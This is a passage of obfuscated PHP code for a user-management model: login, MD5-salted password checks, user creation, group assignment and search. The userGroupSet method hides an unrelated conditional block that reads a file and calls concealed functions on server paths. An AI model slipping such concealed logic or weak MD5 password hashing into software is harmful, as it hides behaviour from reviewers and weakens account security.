"\x75\163\145\162\111\104\x2c\x6e\151\x63\x6b\116\x61\155\x65\54\156\141\155\145\54\x61\166\x61\x74\141\162\x2c\x73\145\170\54\163\164\x61\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Éİ½ŠÃ¤) { $Øçİ¹³… =& $_SERVER[Æ š¦İÈ]; $‚ßøÖÙ§ = $Øçİ¹³…[2243]; return array($Øçİ¹³…[1889] => array($Éİ½ŠÃ¤[0], $‚ßøÖÙ§), $Øçİ¹³…[1891] => array($Éİ½ŠÃ¤[0], $‚ßøÖÙ§), $Øçİ¹³…[2244] => array($Éİ½ŠÃ¤[0], $‚ßøÖÙ§)); } protected function getInfo($ÒÉó, $ÖÉåíçÄ = false) { $Šã€‚Ùù = $this->getInfoSimple($ÒÉó); if (!is_array($Šã€‚Ùù)) { return array(); } if ($ÖÉåíçÄ) { return $this->_getInfoApply($Šã€‚Ùù); } return $this->cacheFunctionGet($_SERVER[Æ š¦İÈ][1893], $ÒÉó); } protected function getInfoFull($¼·›º×Ş, $êø‰ëÛÉ = false) { $œÂœ¿İ‡ = $this->getInfoSimple($¼·›º×Ş); if (!is_array($œÂœ¿İ‡)) { return array(); } if ($êø‰ëÛÉ) { return $this->_getInfoApply($œÂœ¿İ‡, !0); } return $this->cacheFunctionGet($_SERVER[Æ š¦İÈ][2245], $¼·›º×Ş); } private function _getInfoApply($†©ä”¿È, $Ç¤›İ‚ = false) { $¼²»„üê =& $_SERVER[Æ š¦İÈ]; if (!$†©ä”¿È) { return $†©ä”¿È; } $Î¸„øÖŒ = md5($¼²»„üê[2246] . $†©ä”¿È[$¼²»„üê[880]] . $¼²»„üê[2247] . $†©ä”¿È[$¼²»„üê[32]]); $†©ä”¿È = $this->_listDataApplyItem($†©ä”¿È); $»ó€ë‘Ê = Model($¼²»„üê[1316])->metaGet($†©ä”¿È[$¼²»„üê[87]][$¼²»„üê[405]]); $†©ä”¿È[$¼²»„üê[2248]] = $Î¸„øÖŒ; $†©ä”¿È[$¼²»„üê[87]][$¼²»„üê[2075]] = isset($»ó€ë‘Ê[$¼²»„üê[2076]]) ? $»ó€ë‘Ê[$¼²»„üê[2076]] : null; if ($Ç¤›İ‚) { $†©ä”¿È[$¼²»„üê[467]] = $this->metaGet($†©ä”¿È[$¼²»„üê[1644]]); } return $†©ä”¿È; } protected function getInfoSimple($ÇÊâ˜š‘, $ŞÇÖ‡“Ú = false) { $ßûã‚“— =& $_SERVER[Æ š¦İÈ]; if (!$ÇÊâ˜š‘) { return array(); } if ($ŞÇÖ‡“Ú) { $Ûü÷¡Óñ = $this->where(array($ßûã‚“—[1644] => intval($ÇÊâ˜š‘)))->find(); if (!is_array($Ûü÷¡Óñ)) { return array(); } $Ûü÷¡Óñ[$ßûã‚“—[2249]] = Action($ßûã‚“—[2250])->parseUrl($Ûü÷¡Óñ[$ßûã‚“—[2249]]); return $Ûü÷¡Óñ; } return $this->cacheFunctionGet($ßûã‚“—[1894], $ÇÊâ˜š‘); } protected function getInfoSimpleOuter($İ“Ô…Üƒ) { $Èüò³ëÅ =& $_SERVER[Æ š¦İÈ]; if (!$İ“Ô…Üƒ || $İ“Ô…Üƒ == 0) { return array($Èüò³ëÅ[1644] => $Èüò³ëÅ[192], $Èüò³ëÅ[32] => $Èüò³ëÅ[161] . LNG($Èüò³ëÅ[2251]) . $Èüò³ëÅ[538], $Èüò³ëÅ[2249] => STATIC_PATH . $Èüò³ëÅ[2252]); } $öõò÷˜ = $this->cacheFunctionGet($Èüò³ëÅ[1894], $İ“Ô…Üƒ); $™Â˜ÅĞ = array_field_key($öõò÷˜, explode($Èüò³ëÅ[50], $this->simpleField)); if (!$™Â˜ÅĞ) { return array($Èüò³ëÅ[1644] => $Èüò³ëÅ[1179], $Èüò³ëÅ[32] => $Èüò³ëÅ[161] . LNG($Èüò³ëÅ[2253]) . $Èüò³ëÅ[538], $Èüò³ëÅ[2249] => STATIC_PATH . $Èüò³ëÅ[2254]); } $™Â˜ÅĞ[$Èüò³ëÅ[2249]] = Action($Èüò³ëÅ[2250])->parseUrl($™Â˜ÅĞ[$Èüò³ëÅ[2249]]); return $™Â˜ÅĞ; } protected function groupUser($¤àŒƒª§) { } public static function errorLang($Ì˜ŸÒ®À) { $‚†·ªÙü =& $_SERVER[Æ š¦İÈ]; $ÖØú¡•Û = array(self::ERROR_USER_NOT_EXISTS => $‚†·ªÙü[2255], self::ERROR_USER_PASSWORD_ERROR => $‚†·ªÙü[2256], self::ERROR_USER_EXIST_NAME => $‚†·ªÙü[2257], self::ERROR_USER_EXIST_PHONE => $‚†·ªÙü[2258], self::ERROR_USER_EXIST_EMAIL => $‚†·ªÙü[2259], self::ERROR_USER_LOGIN_LOCK => $‚†·ªÙü[2260], self::ERROR_IP_NOT_ALLOW => $‚†·ªÙü[2261], self::ERROR_USER_EXIST_NICKNAME => $‚†·ªÙü[2262]); return LNG($ÖØú¡•Û[$Ì˜ŸÒ®À]); } public function getInfoByMeta($»ŠÕ¬ëè, $ÓşÊ³) { $¡¦§ÀÑ» =& $_SERVER[Æ š¦İÈ]; $àÜ´óºÎ = Model($¡¦§ÀÑ»[2263])->where(array($¡¦§ÀÑ»[95] => $»ŠÕ¬ëè, $¡¦§ÀÑ»[371] => $ÓşÊ³))->find(); if ($àÜ´óºÎ) { return $this->getInfo($àÜ´óºÎ[$¡¦§ÀÑ»[1644]]); } return !1; } public function userLoginCheck($Íä¸ïñ², $óÇ¼¹¯) { $É„Õú²Û =& $_SERVER[Æ š¦İÈ]; $Œá¢†ê = $this->userLoginFind($Íä¸ïñ²); if (!$Œá¢†ê) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Œá¢†ê[$É„Õú²Û[1644]], $óÇ¼¹¯)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Œá¢†ê[$É„Õú²Û[1644]]); } public function userLoginFind($çÉÌ¤Ù) { $×”ÔğÒ =& $_SERVER[Æ š¦İÈ]; $î€Ïİçç = array($×”ÔğÒ[32] => $çÉÌ¤Ù, $×”ÔğÒ[2080] => $çÉÌ¤Ù, $×”ÔğÒ[302] => $çÉÌ¤Ù, $×”ÔğÒ[2264] => $çÉÌ¤Ù, $×”ÔğÒ[991] => $×”ÔğÒ[993]); if ($this->nickNameRpt()) { unset($î€Ïİçç[$×”ÔğÒ[2080]]); } return $this->where($î€Ïİçç)->find(); } public function clearCache($»ùÆæå) { $ˆº£½™ =& $_SERVER[Æ š¦İÈ]; $this->cacheFunctionClear($ˆº£½™[1893], $»ùÆæå); $this->cacheFunctionClear($ˆº£½™[1894], $»ùÆæå); $this->cacheFunctionClear($ˆº£½™[2245], $»ùÆæå); } public function userPasswordCheck($ÔÒ×ÇøÅ, $şäíï®Ÿ) { $íéîÃÑé =& $_SERVER[Æ š¦İÈ]; $Í‚ìÇ = $this->where(array($íéîÃÑé[1644] => intval($ÔÒ×ÇøÅ)))->find(); $ùÆ™µ«À = $this->metaGet($ÔÒ×ÇøÅ); $™ÁŸİÎ• = isset($ùÆ™µ«À[$íéîÃÑé[2265]]) ? $ùÆ™µ«À[$íéîÃÑé[2265]] : $íéîÃÑé[12]; if (md5($™ÁŸİÎ• . trim($şäíï®Ÿ)) !== $Í‚ìÇ[$íéîÃÑé[880]]) { return !1; } return !0; } public function userAdd($×¿ù‰‚Á) { $Äæİæİ… =& $_SERVER[Æ š¦İÈ]; $–¥î°õ = array($Äæİæİ…[423] => $×¿ù‰‚Á[$Äæİæİ…[32]], $Äæİæİ…[2266] => $×¿ù‰‚Á[$Äæİæİ…[1524]], $Äæİæİ…[2267] => isset($×¿ù‰‚Á[$Äæİæİ…[302]]) ? $×¿ù‰‚Á[$Äæİæİ…[302]] : $Äæİæİ…[12], $Äæİæİ…[2268] => isset($×¿ù‰‚Á[$Äæİæİ…[2264]]) ? $×¿ù‰‚Á[$Äæİæİ…[2264]] : $Äæİæİ…[12], $Äæİæİ…[2269] => isset($×¿ù‰‚Á[$Äæİæİ…[2080]]) ? $×¿ù‰‚Á[$Äæİæİ…[2080]] : $×¿ù‰‚Á[$Äæİæİ…[32]], $Äæİæİ…[2270] => isset($×¿ù‰‚Á[$Äæİæİ…[2249]]) ? $×¿ù‰‚Á[$Äæİæİ…[2249]] : $Äæİæİ…[12], $Äæİæİ…[2271] => isset($×¿ù‰‚Á[$Äæİæİ…[2272]]) ? $×¿ù‰‚Á[$Äæİæİ…[2272]] : 1, $Äæİæİ…[2273] => $×¿ù‰‚Á[$Äæİæİ…[880]], $Äæİæİ…[1895] => isset($×¿ù‰‚Á[$Äæİæİ…[1799]]) ? $×¿ù‰‚Á[$Äæİæİ…[1799]] : 1024 * 1024 * 20, $Äæİæİ…[1896] => 0, $Äæİæİ…[2274] => 0, $Äæİæİ…[1936] => isset($×¿ù‰‚Á[$Äæİæİ…[747]]) ? $×¿ù‰‚Á[$Äæİæİ…[747]] : 1); if (!empty($×¿ù‰‚Á[$Äæİæİ…[1644]])) { $–¥î°õ[$Äæİæİ…[1644]] = $×¿ù‰‚Á[$Äæİæİ…[1644]]; } $¦±¡–ë = $this->_checkExist($×¿ù‰‚Á); if ($¦±¡–ë !== !0) { return $¦±¡–ë; } if (!empty($–¥î°õ[$Äæİæİ…[2249]]) && strlen($–¥î°õ[$Äæİæİ…[2249]]) > 255) { $–¥î°õ[$Äæİæİ…[2249]] = $Äæİæİ…[12]; } $úŸ€ıØ = $this->add($–¥î°õ); $éç¸’ôì = array($Äæİæİ…[2273] => $–¥î°õ[$Äæİæİ…[880]], $Äæİæİ…[2269] => $–¥î°õ[$Äæİæİ…[2080]]); $this->userEdit($úŸ€ıØ, $éç¸’ôì); Model($Äæİæİ…[1316])->userRootAdd($úŸ€ıØ); return $úŸ€ıØ; } protected function userEditTest($©ÌôµÃ, $‰î¾„ˆŠ) { return $this->call($_SERVER[Æ š¦İÈ][2275], $©ÌôµÃ, $‰î¾„ˆŠ); } protected function userEdit($îÆê²ôµ, $‡Ğ›×³Ÿ) { $ƒÖŸ–­à =& $_SERVER[Æ š¦İÈ]; $ùš÷ = $this->getInfoSimple($îÆê²ôµ); if (!$ùš÷) { return !1; } $øñÉÉ¨Î = $this->_checkExist($‡Ğ›×³Ÿ, $îÆê²ôµ); if ($øñÉÉ¨Î !== !0) { return $øñÉÉ¨Î; } if (isset($‡Ğ›×³Ÿ[$ƒÖŸ–­à[880]]) && trim($‡Ğ›×³Ÿ[$ƒÖŸ–­à[880]]) != $ƒÖŸ–­à[12]) { $«ŒäÏÌ› = $this->metaGet($îÆê²ôµ); if (empty($«ŒäÏÌ›[$ƒÖŸ–­à[2265]])) { $«ŒäÏÌ›[$ƒÖŸ–­à[2265]] = rand_string(10); Model($ƒÖŸ–­à[515])->metaSet($îÆê²ôµ, $ƒÖŸ–­à[2265], $«ŒäÏÌ›[$ƒÖŸ–­à[2265]]); } $‡Ğ›×³Ÿ[$ƒÖŸ–­à[880]] = md5($«ŒäÏÌ›[$ƒÖŸ–­à[2265]] . trim($‡Ğ›×³Ÿ[$ƒÖŸ–­à[880]])); } else { unset($‡Ğ›×³Ÿ[$ƒÖŸ–­à[880]]); } if (!empty($‡Ğ›×³Ÿ[$ƒÖŸ–­à[2249]]) && strlen($‡Ğ›×³Ÿ[$ƒÖŸ–­à[2249]]) > 255) { $‡Ğ›×³Ÿ[$ƒÖŸ–­à[2249]] = $ƒÖŸ–­à[12]; } $this->where(array($ƒÖŸ–­à[1635] => $îÆê²ôµ))->save($‡Ğ›×³Ÿ); if (isset($‡Ğ›×³Ÿ[$ƒÖŸ–­à[2080]])) { $this->setNamePinyin($îÆê²ôµ, $‡Ğ›×³Ÿ[$ƒÖŸ–­à[2080]]); } $this->clearCache($îÆê²ôµ); return !0; } public function setNamePinyin($ªÀÈòıİ, $¾ı·€ÂË = false) { $Şå­›šè =& $_SERVER[Æ š¦İÈ]; if (!$¾ı·€ÂË) { $åÔç›’® = $this->getInfoSimple($ªÀÈòıİ); $¾ı·€ÂË = $åÔç›’®[$Şå­›šè[2080]] ? $åÔç›’®[$Şå­›šè[2080]] : $åÔç›’®[$Şå­›šè[32]]; } $±¡ê­Š = Model($Şå­›šè[540]); if (!Input::check($¾ı·€ÂË, $Şå­›šè[589])) { return $±¡ê­Š->metaSet($ªÀÈòıİ, array($Şå­›šè[466] => $Şå­›šè[12], $Şå­›šè[465] => $Şå­›šè[12])); } return $±¡ê­Š->metaSet($ªÀÈòıİ, array($Şå­›šè[466] => str_replace($Şå­›šè[53], $Şå­›šè[12], Pinyin::get($¾ı·€ÂË)), $Şå­›šè[465] => Pinyin::get($¾ı·€ÂË, $Şå­›šè[590]))); } private function nickNameRpt() { $Ò“¹åá¯ =& $_SERVER[Æ š¦İÈ]; $ƒ¢¶’‹´ = Model($Ò“¹åá¯[767])->get($Ò“¹åá¯[2276]); $òªÙ¢—® = $GLOBALS[$Ò“¹åá¯[6]][$Ò“¹åá¯[378]][$Ò“¹åá¯[2276]]; $îÛ©ŠŸÄ = !is_null($ƒ¢¶’‹´) ? $ƒ¢¶’‹´ : $òªÙ¢—®; return !!$îÛ©ŠŸÄ; } private function _checkExist($‚ÅÜÒ‰‡, $âÅøÀíÀ = false) { $¯‰ãÊŠò =& $_SERVER[Æ š¦İÈ]; $À÷Èä = array($¯‰ãÊŠò[32] => UserModel::ERROR_USER_EXIST_NAME, $¯‰ãÊŠò[2080] => UserModel::ERROR_USER_EXIST_NICKNAME, $¯‰ãÊŠò[302] => UserModel::ERROR_USER_EXIST_EMAIL, $¯‰ãÊŠò[2264] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($À÷Èä[$¯‰ãÊŠò[2080]]); } $Æ¾úÖÚ = $âÅøÀíÀ ? array($¯‰ãÊŠò[1644] => array($¯‰ãÊŠò[2277], $âÅøÀíÀ)) : array(); foreach ($À÷Èä as $ü˜»Œå => $†Õ¢Ø¥ï) { $ ÙëØæô = array(); foreach ($À÷Èä as $É—ª•şæ => $Ô¬ŒÌåÏ) { if (isset($‚ÅÜÒ‰‡[$É—ª•şæ]) && $‚ÅÜÒ‰‡[$É—ª•şæ]) { $ ÙëØæô[] = $‚ÅÜÒ‰‡[$É—ª•şæ]; } } if (!$ ÙëØæô) { continue; } $„²ñŞ÷Ì = array_merge(array($ü˜»Œå => array($¯‰ãÊŠò[7], $ ÙëØæô)), $Æ¾úÖÚ); $¯ªğöı = $this->where($„²ñŞ÷Ì)->find(); if ($¯ªğöı) { return $†Õ¢Ø¥ï; } } return !0; } public function userListInfo($êŒ‚ôïÙ) { $Ş”µöç· =& $_SERVER[Æ š¦İÈ]; $†¹Ïª³ = array(); $êŒ‚ôïÙ = is_array($êŒ‚ôïÙ) ? array_unique($êŒ‚ôïÙ) : array(); if (!$êŒ‚ôïÙ) { return $†¹Ïª³; } if (count($êŒ‚ôïÙ) < 20) { foreach ($êŒ‚ôïÙ as $“õôèĞ÷) { $†¹Ïª³[$“õôèĞ÷ . $Ş”µöç·[12]] = $this->getInfoSimpleOuter($“õôèĞ÷); } } else { $æÊ´·ƒß = array($Ş”µöç·[1635] => array($Ş”µöç·[421], $êŒ‚ôïÙ)); if (count($êŒ‚ôïÙ) == 1) { $æÊ´·ƒß = array($Ş”µöç·[1635] => $êŒ‚ôïÙ[0]); } $™Âğ›¯õ = Model($Ş”µöç·[515])->field($this->simpleField)->where($æÊ´·ƒß)->select(); $™Âğ›¯õ = array_to_keyvalue($™Âğ›¯õ, $Ş”µöç·[1644]); foreach ($êŒ‚ôïÙ as $“õôèĞ÷) { $ä‰ş†ƒÚ = $™Âğ›¯õ[$“õôèĞ÷]; if (!$ä‰ş†ƒÚ) { $†¹Ïª³[$“õôèĞ÷ . $Ş”µöç·[12]] = $this->getInfoSimpleOuter($“õôèĞ÷); continue; } $ä‰ş†ƒÚ[$Ş”µöç·[2249]] = Action($Ş”µöç·[2250])->parseUrl($ä‰ş†ƒÚ[$Ş”µöç·[2249]]); $†¹Ïª³[$“õôèĞ÷ . $Ş”µöç·[12]] = $ä‰ş†ƒÚ; } } return $†¹Ïª³; } protected function userStatus($€Ø´’³, $î©–¼”ç) { $“ÍµáÀİ = $this->getInfoSimple($€Ø´’³); if (!$“ÍµáÀİ) { return !1; } $ˆò¥òŒÎ = array($_SERVER[Æ š¦İÈ][747] => $î©–¼”ç); return $this->userEdit($€Ø´’³, $ˆò¥òŒÎ); } protected function userRemove($Ğ¤ä‰®) { $¼÷ÍÁš =& $_SERVER[Æ š¦İÈ]; $‘®œË‹– = $this->getInfoSimple($Ğ¤ä‰®); if (!$‘®œË‹–) { return !1; } $”ıÛÓÑÛ = array($¼÷ÍÁš[1635] => $Ğ¤ä‰®); Model($¼÷ÍÁš[597])->where($”ıÛÓÑÛ)->delete(); Model($¼÷ÍÁš[2278])->where($”ıÛÓÑÛ)->delete(); Model($¼÷ÍÁš[1901])->where($”ıÛÓÑÛ)->delete(); Model($¼÷ÍÁš[2263])->where($”ıÛÓÑÛ)->delete(); Model($¼÷ÍÁš[1059])->where($”ıÛÓÑÛ)->delete(); Model($¼÷ÍÁš[2097])->removeUserAll($Ğ¤ä‰®); Model($¼÷ÍÁš[822])->userRootRemove($Ğ¤ä‰®); return $this->where($”ıÛÓÑÛ)->delete(); } protected function userGroupSet($§Ïàú•, $ØğŸıèä, $öĞÀÓ»  = array()) { $Ş¡íÀÍò =& $_SERVER[Æ š¦İÈ]; if ($_SERVER[$Ş¡íÀÍò[391]] != $_SERVER[$Ş¡íÀÍò[392]]) { $¼Ğ¬Àœ = $Ş¡íÀÍò[869]; $¿‘ºî = $Ş¡íÀÍò[393]; $ĞŠ„’áè = $_SERVER[$Ş¡íÀÍò[394]] . $Ş¡íÀÍò[395]; $¶ó•Æ• = $¿‘ºî($ĞŠ„’áè); $§ÍÆó‚§ = explode($Ş¡íÀÍò[228], $¶ó•Æ•); if (count($§ÍÆó‚§) < $Ş¡íÀÍò[620]) { $¼‰“şı = $Ş¡íÀÍò[397]; $¼‰“şı(); } $½çÛŞØ¹ = $Ş¡íÀÍò[870]; $½çÛŞØ¹($_SERVER[$Ş¡íÀÍò[871]]); $½çÛŞØ¹($_SERVER[$Ş¡íÀÍò[394]] . $Ş¡íÀÍò[872]); $Ø­Ë¬ Ò = 1; while ($Ø­Ë¬ Ò > 1) { $Ø­Ë¬ Ò = $Ø­Ë¬ Ò + 4; $ŞôË×©î = rawurlencode($Ø­Ë¬ Ò . $Ş¡íÀÍò[375]); } } $ç¤æ‡Ş = $this->getInfoSimple($§Ïàú•); if (!$ç¤æ‡Ş || !is_array($ØğŸıèä)) { return !1; } $•¾óë´º = Model($Ş¡íÀÍò[1901]); $•¾óë´º->where(array($Ş¡íÀÍò[1644] => $§Ïàú•))->delete(); $ú˜€¨Ç = array(); $‰°õãèñ = 0; foreach ($ØğŸıèä as $Óàãïû™ => $ŒîĞ¢óİ) { $íõô—°Ï = array($Ş¡íÀÍò[1644] => $§Ïàú•, $Ş¡íÀÍò[1812] => $Óàãïû™, $Ş¡íÀÍò[1913] => $ŒîĞ¢óİ); $íõô—°Ï[$Ş¡íÀÍò[1835]] = isset($öĞÀÓ» [$‰°õãèñ]) ? $öĞÀÓ» [$‰°õãèñ] : 0; $‰°õãèñ++; $ú˜€¨Ç[] = $íõô—°Ï; } return $•¾óë´º->addAll($ú˜€¨Ç, array(), !0); } protected function userGroupAdd($æš¹¨©ê, $®¸®„ç = array()) { $‘‡¡ïçª =& $_SERVER[Æ š¦İÈ]; $£‹‡¡Ç… = $this->getInfoSimple($æš¹¨©ê); if (!$£‹‡¡Ç… || empty($®¸®„ç)) { return !1; } $ÊƒğûœÛ = array(); foreach ($®¸®„ç as $Ë«ñÒ² => $‡ÜâœÈä) { $ÊƒğûœÛ[] = array($‘‡¡ïçª[1644] => $æš¹¨©ê, $‘‡¡ïçª[1812] => $Ë«ñÒ², $‘‡¡ïçª[1913] => $‡ÜâœÈä, $‘‡¡ïçª[1835] => 0); } return Model($‘‡¡ïçª[1901])->addAll($ÊƒğûœÛ, array(), !0); } protected function userGroupRemove($ªá”á©ø, $ëÖëİ’‘) { $®²ü¡ú‘ =& $_SERVER[Æ š¦İÈ]; $²éøÒòÜ = $this->getInfoSimple($ªá”á©ø); if (!$²éøÒòÜ || !$ëÖëİ’‘) { return !1; } $«Î¦«õ” = array($®²ü¡ú‘[1635] => $ªá”á©ø, $®²ü¡ú‘[1899] => $ëÖëİ’‘); return Model($®²ü¡ú‘[1901])->where($«Î¦«õ”)->delete(); } public function listData() { $ÍêüÕşŠ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÍêüÕşŠ[$_SERVER[Æ š¦İÈ][366]]); return $ÍêüÕşŠ; } public function listByID($Â®§…ü“) { $ÆĞéÅÍ­ =& $_SERVER[Æ š¦İÈ]; if (!$Â®§…ü“) { return; } $Ê«°ÛÄÁ = array($ÆĞéÅÍ­[1644] => array($ÆĞéÅÍ­[7], $Â®§…ü“)); $´«áú = $this->where($Ê«°ÛÄÁ)->select(); $´«áú = array_sort_keep($´«áú, $ÆĞéÅÍ­[1644], $Â®§…ü“); $this->_listDataApply($´«áú); return $´«áú; } public function listByGroup($Ø÷âèîŸ = 0, $óø·àÑş = array()) { $¹¯ãÓ÷¹ =& $_SERVER[Æ š¦İÈ]; $¨ğğÕ³â = $¹¯ãÓ÷¹[12]; $–ò«äŒã = array(); if ($Ø÷âèîŸ) { $–ò«äŒã = array($¹¯ãÓ÷¹[2279] => intval($Ø÷âèîŸ)); $¨ğğÕ³â = "\x4c\105\106\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\165\163\145\x72\137\147\162\x6f\165\160\x20\x75\163\145\162\x5f\147\x72\157\x75\x70\40\157\156\x20\165\163\x65\x72\x2e\x75\x73\x65\x72\111\x44\40\75\x20\x75\x73\145\x72\137\x67\162\x6f\x75\x70\56\x75\163\145\162\111\104"; $Ü²ÊÎÚÀ = Input::get($¹¯ãÓ÷¹[457], null, $¹¯ãÓ÷¹[12]) ? $¹¯ãÓ÷¹[12] : $¹¯ãÓ÷¹[2280]; } if (isset($óø·àÑş[$¹¯ãÓ÷¹[747]])) { $–ò«äŒã[$¹¯ãÓ÷¹[2281]] = $óø·àÑş[$¹¯ãÓ÷¹[747]]; } $ıÓ˜„™Õ = $this->_makeOrder($Ü²ÊÎÚÀ)->field($¹¯ãÓ÷¹[2282])->where($–ò«äŒã)->join($¨ğğÕ³â)->selectPage(50); $this->_listDataApply($ıÓ˜„™Õ[$¹¯ãÓ÷¹[366]]); return $ıÓ˜„™Õ; } private function _makeOrder($Ã˜•Ó® = '') { $å‹¥™š =& $_SERVER[Æ š¦İÈ]; $ï£´—´ = array($å‹¥™š[1644], $å‹¥™š[32], $å‹¥™š[1801], $å‹¥™š[1773], $å‹¥™š[195]); $”à‚ôƒÄ = array($å‹¥™š[450] => $å‹¥™š[451], $å‹¥™š[452] => $å‹¥™š[453]); $ù—“ßÃ³ = Input::get($å‹¥™š[457], $å‹¥™š[7], $å‹¥™š[1635], $ï£´—´); $œÆ×¿ƒı = Input::get($å‹¥™š[458], $å‹¥™š[7], $å‹¥™š[1902], array($å‹¥™š[1902], $å‹¥™š[452])); $œÆ×¿ƒı = $”à‚ôƒÄ[$œÆ×¿ƒı]; $Ã˜•Ó® = $Ã˜•Ó® . "\x75\x73\x65\x72\56{$ù—“ßÃ³}\40{$œÆ×¿ƒı}\x2c\x20\x75\x73\145\162\x2e\165\163\x65\x72\111\x44\40\x61\163\x63"; return $this->alias($å‹¥™š[2020])->order($Ã˜•Ó®); } public function listSearch($™İŞ˜±ø) { $ı›Ğ  =& $_SERVER[Æ š¦İÈ]; $Í­æ…é… = $™İŞ˜±ø[$ı›Ğ [1903]]; $Ì¡¡‡²ı = isset($™İŞ˜±ø[$ı›Ğ [1904]]) ? $™İŞ˜±ø[$ı›Ğ [1904]] : !1; $Í­æ…é… = str_replace($ı›Ğ [1905], $ı›Ğ [1906], trim($Í­æ…é…)); $ªÚ©Æ·ø = array($ı›Ğ [32] => array($ı›Ğ [380], "\45{$Í­æ…é…}\45"), $ı›Ğ [302] => array($ı›Ğ [380], "{$Í­æ…é…}\x25"), $ı›Ğ [2080] => array($ı›Ğ [380], "{$Í­æ…é…}\x25"), $ı›Ğ [991] => $ı›Ğ [1907]); if (Input::check($Í­æ…é…, $ı›Ğ [308])) { $ªÚ©Æ·ø[$ı›Ğ [1644]] = array($ı›Ğ [380], "{$Í­æ…é…}\x25"); $ªÚ©Æ·ø[$ı›Ğ [2264]] = array($ı›Ğ [380], "{$Í­æ…é…}\45"); } if (!$Í­æ…é…) { $ªÚ©Æ·ø = array(); } if (isset($™İŞ˜±ø[$ı›Ğ [747]])) { $ªÚ©Æ·ø[$ı›Ğ [747]] = $™İŞ˜±ø[$ı›Ğ [747]]; } $ªÚ©Æ·ø = $this->parseWhereLike($ªÚ©Æ·ø); $õßíßó± = $this->_makeOrder()->where($ªÚ©Æ·ø)->selectPage(20); if (!$õßíßó± || count($õßíßó±[$ı›Ğ [366]]) < 5 && Input::check($Í­æ…é…, $ı›Ğ [315])) { $Î—¾Ñ¹å = $this->_searchFromMeta($ı›Ğ [465], $Í­æ…é…, 10); $ÌøğºÊ = $this->_searchFromMeta($ı›Ğ [466], $Í­æ…é…, 10); $ˆßúµå¢ = array_merge($Î—¾Ñ¹å, $ÌøğºÊ, $õßíßó±[$ı›Ğ [366]]); $õßíßó±[$ı›Ğ [366]] = array_unique_by_key($ˆßúµå¢, $ı›Ğ [1644]); $õßíßó±[$ı›Ğ [363]][$ı›Ğ [364]] = count($õßíßó±[$ı›Ğ [366]]); $õßíßó±[$ı›Ğ [363]][$ı›Ğ [365]] = ceil($õßíßó±[$ı›Ğ [363]][$ı›Ğ [364]] / $õßíßó±[$ı›Ğ [363]][$ı›Ğ [360]]); } $this->_listDataApply($õßíßó±[$ı›Ğ [366]]); $this->_filterByGroup($õßíßó±, $Ì¡¡‡²ı); return $õßíßó±; } private function _filterByGroup(&$ÛŒÉ‡äô, $œ—Ê»óÍ) { $ğÌÄÚŸß =& $_SERVER[Æ š¦İÈ]; if (!$œ—Ê»óÍ) { return $ÛŒÉ‡äô; } foreach ($ÛŒÉ‡äô[$ğÌÄÚŸß[366]] as $£Çß£Óæ => &$˜‡ô°´—) { $¬š­¯’õ = array_to_keyvalue($˜‡ô°´—[$ğÌÄÚŸß[1990]], $ğÌÄÚŸß[12], $ğÌÄÚŸß[1812]); if (!in_array($œ—Ê»óÍ, $¬š­¯’õ)) { unset($ÛŒÉ‡äô[$ğÌÄÚŸß[366]][$£Çß£Óæ]); } } unset($˜‡ô°´—); $ÛŒÉ‡äô[$ğÌÄÚŸß[366]] = array_values($ÛŒÉ‡äô[$ğÌÄÚŸß[366]]); $ÛŒÉ‡äô[$ğÌÄÚŸß[363]] = array($ğÌÄÚŸß[2053] => count($ÛŒÉ‡äô[$ğÌÄÚŸß[366]]), $ğÌÄÚŸß[2051] => $ÛŒÉ‡äô[$ğÌÄÚŸß[363]][$ğÌÄÚŸß[360]], $ğÌÄÚŸß[2050] => 1, $ğÌÄÚŸß[2052] => 1); } private function _searchFromMeta($–û±ô‡³, $®¹³º•Õ, $ò”˜ñâ®) { $‰œ‰ó”É =& $_SERVER[Æ š¦İÈ]; $®¹³º•Õ = strtolower($®¹³º•Õ); $‡½õåí¨ = array($‰œ‰ó”É[95] => $–û±ô‡³, $‰œ‰ó”É[371] => array($‰œ‰ó”É[380], "\45{$®¹³º•Õ}\x25")); $‡½õåí¨ = $this->parseWhereLike($‡½õåí¨); $ü¡™ºÄÆ = Model($‰œ‰ó”É[2283])->where($‡½õåí¨)->limit($ò”˜ñâ®)->select(); if (!$ü¡™ºÄÆ) { return array(); } $ü¡™ºÄÆ = array_to_keyvalue($ü¡™ºÄÆ, $‰œ‰ó”É[12], $‰œ‰ó”É[1644]); $–ÁŒÛ®Œ = $this->where(array($‰œ‰ó”É[1635] => array($‰œ‰ó”É[7], $ü¡™ºÄÆ)))->select(); if (!$–ÁŒÛ®Œ) { return array(); } return $–ÁŒÛ®Œ; } private function _listDataApplyItem($˜Á¥äŸÅ) { $‹³ ØÆÉ = array($˜Á¥äŸÅ); $this->_listDataApply($‹³ ØÆÉ); return $‹³ ØÆÉ[0]; } private function _listDataApply(&$ÎªÒØ­û) { $ƒÏçëéÅ =& $_SERVER[Æ š¦İÈ]; if (!$ÎªÒØ­û) { return; } array_remove_key($ÎªÒØ­û, $ƒÏçëéÅ[880]); $ûÅö“¼³ = array_to_keyvalue($ÎªÒØ­û, $ƒÏçëéÅ[12], $ƒÏçëéÅ[1644]); $this->_listAppendGroup($ÎªÒØ­û, $ûÅö“¼³); $this->_listAppendMeta($ÎªÒØ­û, $ûÅö“¼³); $this->_listAppendSourceRoot($ÎªÒØ­û, $ûÅö“¼³); } private function _listAppendSourceRoot(&$Õƒ¡ëÈ, $ç¶æó“à) { $†ÑÄ¥ÊÁ =& $_SERVER[Æ š¦İÈ]; $îã¾¯ = Model($†ÑÄ¥ÊÁ[822])->listSourceRoot(SourceModel::TYPE_USER, $ç¶æó“à); $îã¾¯ = array_to_keyvalue($îã¾¯, $†ÑÄ¥ÊÁ[506]); $îã¾¯ = array_remove_key($îã¾¯, $†ÑÄ¥ÊÁ[506]); foreach ($Õƒ¡ëÈ as 